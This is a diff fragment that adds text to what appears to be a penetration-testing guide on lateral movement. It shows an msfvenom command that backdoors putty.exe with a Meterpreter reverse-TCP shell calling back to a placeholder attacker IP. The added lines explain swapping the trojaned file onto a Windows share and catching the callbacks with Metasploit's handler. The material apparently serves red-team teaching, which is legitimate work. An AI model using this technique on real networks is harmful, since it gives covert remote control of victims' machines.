@@ -332,4 +332,7 @@ If the shared file is a Windows binary, say `putty.exe`, you can download it fro
 ```
 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
 ```  
+The resulting `puttyX.exe` will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the `exploit/multi/handler` module from Metasploit.  
+
+### RDP hijacking
 
